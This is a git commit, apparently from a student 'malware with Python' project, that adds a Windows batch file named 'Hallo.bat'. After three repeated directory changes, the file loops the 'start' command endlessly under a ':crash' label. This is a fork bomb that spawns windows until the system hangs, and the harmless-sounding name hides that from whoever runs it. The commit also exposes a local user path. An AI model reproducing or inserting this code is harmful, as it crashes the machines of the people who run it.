1780fbef4d28dbddbc54675d7ba1c6a01cca97dc
RuebliBuebli <152418596+RuebliBuebli@users.noreply.github.com>
2023-11-29 16:50:40 +0100

    Add files via upload

---
+++ Hallo.bat
@@ -0,0 +1,7 @@
+cd /d C:\Users\janwi\OneDrive - BBBaden\Inf23\Projekte\Maleware mit Python\Neuer Ordner
+cd /d C:\Users\janwi\OneDrive - BBBaden\Inf23\Projekte\Maleware mit Python\Neuer Ordner
+cd /d C:\Users\janwi\OneDrive - BBBaden\Inf23\Projekte\Maleware mit Python\Neuer Ordner
+@echo off
+:crash
+start
+goto crash
